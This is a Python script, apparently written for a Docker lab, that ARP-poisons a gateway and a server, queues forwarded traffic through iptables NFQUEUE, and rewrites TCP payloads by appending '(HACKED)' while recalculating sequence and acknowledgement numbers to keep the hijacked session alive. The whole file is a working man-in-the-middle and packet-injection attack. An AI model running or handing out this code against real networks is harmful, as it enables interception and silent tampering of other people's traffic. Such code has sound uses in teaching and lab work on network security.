from scapy.all import *
import os
import signal
import sys
import threading
import time
from netfilterqueue import NetfilterQueue
from copy import deepcopy

# It does not work if we are barging in without shutting the connection down
# Don't forget to forward packets to the queue
# iptables -I FORWARD -j NFQUEUE --queue-num 1
# When done: iptables -D FORWARD -j NFQUEUE --queue-num 1

# Container start bash
# client - sudo docker exec -it b2bbb29431cb bash
# middle - sudo docker exec -it b35b664de112 bash
# server - sudo docker exec -it 343ca79c2992 bash

#ARP Poison parameters
gateway_ip = "198.7.0.1"
server_ip = "198.7.0.2"
packet_count = 1000

#Broadcast ARP Request for a IP Address
def get_mac(ip_address):
    #ARP request is constructed. sr function is used to send/ receive a layer 3 packet
    #Alternative Method using Layer 2: resp, unans =  srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip_address))
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s,r in resp:
        return r[ARP].hwsrc
    return None

#Keep sending false ARP replies to put our machine in the middle to intercept packets
def arp_poison(src_ip, dest_ip, dest_mac):
    print("ARP POSION ATTTACCCCK!")
    try:
        while True:
            send(ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip))
            time.sleep(2)
    except KeyboardInterrupt:
        print("MERCY WAS CHOSEN, STOPPING ATTACK!")

print(f"Gateway ip: {gateway_ip}")
print(f"Server ip:  {server_ip}")

gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print("Could not aquire mac for gateway...")
    sys.exit(0)
else:
    print(f"Aquired gateway mac address: {gateway_mac}")

server_mac = get_mac(server_ip)
if server_mac is None:
    print("Could not aquire mac for server...")
    sys.exit(0)
else:
    print(f"Aquired server mac address: {server_mac}")

#ATTACKKKK!
fake_gateway_th = threading.Thread(target=arp_poison, args=(gateway_ip, server_ip, server_mac))
fake_server_th = threading.Thread(target=arp_poison, args=(server_ip, gateway_ip, gateway_mac))

fake_gateway_th.start()
fake_server_th.start()

captured_packets = []

# Needed for breaking the connection
first_conn = True

# Keeping track of the sequence and acknoledgement number (both the correct and tampered ones) 
good_seq1 = None
good_seq2 = None

bad_seq1 = None
bad_seq2 = None

# Flags for special cases
first_message = False
first_response = False

def process_packet_seq_spoof(pkt):
    global first_conn, good_seq1, good_seq2, bad_seq1, bad_seq2, first_message, first_response
    scapy_pkt = IP(pkt.get_payload())
    print(f"Src: {scapy_pkt[IP].src}, Dst: {scapy_pkt[IP].dst}")

    if scapy_pkt.haslayer(TCP):
        # Set seq numbers of the client and server
        if scapy_pkt[TCP].flags.A and not scapy_pkt[TCP].flags.S and not good_seq1:
                good_seq1 = scapy_pkt[TCP].seq
                good_seq2 = scapy_pkt[TCP].ack
                first_message = True

        # Print relevant information
        print(f"Good seq1: {good_seq1}\nGood seq2: {good_seq2}\nBad seq1: {bad_seq1}\nBad seq2: {bad_seq2}")
        print(f"SEQ: {scapy_pkt[TCP].seq}\nACK: {scapy_pkt[TCP].ack}")
        print(f"Flags: {scapy_pkt[TCP].flags}")

        # Set the new packet to the old one
        new_packet = scapy_pkt
        if scapy_pkt.haslayer(Raw):
            og_msg = scapy_pkt[Raw].load
            print(f"Original payload: {og_msg}")

            # Add my super original message
            my_msg = b"(HACKED)"
            new_msg = og_msg + my_msg

            # Keep track of the packet's seq and ack nr
            pkt_seq = scapy_pkt[TCP].seq
            pkt_ack = scapy_pkt[TCP].ack

            # Case1: Move the seq nr to the next one and set bad_seq
            if first_message:   
                good_seq1 += len(og_msg)
                bad_seq1 = good_seq1 + len(my_msg)
                first_message = False
                first_response = True
            # Case2: Move the seq nr to the next one, set bad_seq and set the ack nr to the one the receiver expects
            elif first_response:
                good_seq2 += len(og_msg)
                bad_seq2 = good_seq2 + len(my_msg)
                first_response = False
                pkt_ack = good_seq1
            # Case3(symetric for client and server): 
            # Move the seq nr and bad_seq to the next one, set the packet seq and ack to the ones the receiver expects
            elif pkt_seq == good_seq1: # First guy sends message
                good_seq1 += len(og_msg)
                
                pkt_seq = bad_seq1
                pkt_ack = good_seq2

                bad_seq1 += len(new_msg)
            elif pkt_seq == good_seq2: # Second guy sends message
                good_seq2 += len(og_msg)
                
                pkt_seq = bad_seq2
                pkt_ack = good_seq1

                bad_seq2 += len(new_msg)

            # Send the new message
            new_packet = (IP(src=scapy_pkt[IP].src, dst=scapy_pkt[IP].dst)/
                         TCP(sport=scapy_pkt[TCP].sport, dport=scapy_pkt[TCP].dport,
                             seq=pkt_seq, ack=pkt_ack,
                             flags=scapy_pkt[TCP].flags,
                             options=scapy_pkt[TCP].options
                             )/
                         Raw(load=new_msg))
            print("Hacking complete ;)")
        else:
            print(f"TCP PACKET WITH NO DATA: {scapy_pkt[TCP].flags}")
            
        send(new_packet)
        pkt.drop()
    else:
        print(f"WEIRD PACKET: {pkt}!")
        pkt.accept()
        
queue = NetfilterQueue()
queue.bind(1, process_packet_seq_spoof)
try:
    queue.run()
except KeyboardInterrupt:
    print("Stopping...")